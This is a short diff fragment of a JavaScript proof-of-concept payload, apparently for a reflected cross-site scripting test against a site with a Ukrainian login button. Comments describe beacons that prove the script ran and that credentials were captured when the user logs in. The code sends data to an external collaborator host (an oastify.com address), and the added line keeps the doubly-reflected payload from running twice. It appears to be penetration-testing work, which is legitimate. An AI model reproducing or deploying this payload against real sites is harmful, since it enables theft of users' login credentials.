@@ -2,6 +2,7 @@
    /loaded  = fired the instant this script runs (proves execution + send channel)
    /creds   = fired when you click Увійти (proves credential capture) */
 (function () {
+  if (window.__poc014) { return; } window.__poc014 = 1;   // reflected twice; run once
   var d = document, O = d.domain;
   var C = 'https://sie3vyepr4bs103ur2xcwnytgkmba24qt.oastify.com/';   // <-- the collaborator YOU watch
   var KEEP = [];
